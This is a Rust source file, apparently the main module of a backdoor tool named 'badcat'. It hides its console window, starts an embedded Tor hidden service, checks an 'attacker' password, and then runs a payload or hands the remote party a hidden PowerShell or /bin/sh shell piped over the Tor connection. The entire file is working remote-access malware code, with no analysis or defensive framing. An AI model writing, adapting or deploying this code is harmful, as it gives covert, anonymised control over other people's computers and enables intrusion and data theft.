// hides console window
#![windows_subsystem = "windows"]

mod config;
mod payload;
mod setting;

use std::error::Error;
use std::io::{Read, Write};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::{env, fs, io};

use setting::Setting;

use badcat_lib::io as badcat_io;
use tor::{stream::Connection, Tor};

fn main() -> Result<(), Box<dyn Error>> {
    let setting = Setting::new()?;

    let argument = env::args().nth(1).unwrap_or("".to_owned());

    if argument.eq("--exec-payload") {
        return payload::execute(&setting);
    }

    if cfg!(unix) {
        // For unix-like OSes enforces the HiddenServiceDir to
        // be private, only readable and writable by the owner.
        //
        // It's a best-effort approach so it can fail and hopefully
        // all works fine.
        if let Ok(proc) = Command::new("chmod")
            .args(["700", &setting.tor_dir])
            .status()
        {
            if !proc.success() {
                println!("WARN: problem changing data directory permission");
            }
        } else {
            println!("WARN: problem calling chmod on data directory");
        }
    }

    start_backdoor(setting)
}

/// Start the server for receiving attacker instructions.
fn start_backdoor(setting: Setting) -> Result<(), Box<dyn Error>> {
    let config = setting.tor_dir_path().join("config");
    unbundle_torrc(&config, &setting)?;

    // start the embeded Tor instance
    let tor = Tor::new(&config);

    tor::stream::listen_connections(80, on_attacker_connection)?;

    tor.stop()
}

/// Write a new torrc to `path`. It always reads the template torrc from `setting`.
fn unbundle_torrc(path: &PathBuf, setting: &Setting) -> io::Result<()> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", &setting.tor_dir);

    fs::write(&path, &contents)
}

fn on_attacker_connection(conn: &mut Connection) {
    let setting = Setting::new().unwrap_or_else(|_| {
        panic!("problem loading settings");
    });

    println!("INFO: received connection");

    if authenticate(conn, &setting) {
        println!("INFO: attacker authenticated");
        if setting.uses_payload {
            // Triggers the payload to execute
            if let Err(err) = payload::from_process() {
                println!("problem creating payload process: {:?}", err);
            }
        } else if let Err(error) = connect_shell(conn) {
            println!("connection error: {:?}", error);
        }
    } else {
        println!("INFO: failed authentication");
    }
}

/// An extremely simple authentication. Receives the password - 88 bytes
/// by default with the 64 byte secret key - and compares against the secret key.
///
/// Sends a 1 byte one value if authenticated and zero otherwise.
fn authenticate(stream: &mut Connection, setting: &Setting) -> bool {
    let mut buf = Vec::new();

    for _ in 0..setting.key.len() {
        buf.push(0);
    }

    if let Err(err) = stream.read(&mut buf) {
        println!("problem on reading auth: {:?}", err);
        return false;
    };

    let untrusted_key = String::from_utf8_lossy(&buf);

    let equals = untrusted_key.eq(&setting.key);

    let reply = if equals { &[1] } else { &[0] };

    if let Err(err) = stream.write(reply) {
        println!("problem on sending auth reply: {:?}", err);
        return false;
    }

    equals
}

/// Start a shell process and redirect STDIN, STDOUT and STDERR to
/// the TCP stream.
fn connect_shell(stream: &mut Connection) -> Result<(), Box<dyn Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        // used powershell instead of cmd because of hidden console window
        args.extend(["-WindowStyle", "Hidden"]);
        "powershell"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.clone();
    let stream_out = stream.clone();
    let stream_err = stream.clone();

    let in_thread = badcat_io::pipe_io(stream_in, stdin);
    let out_thread = badcat_io::pipe_io(stdout, stream_out);
    let err_thread = badcat_io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}
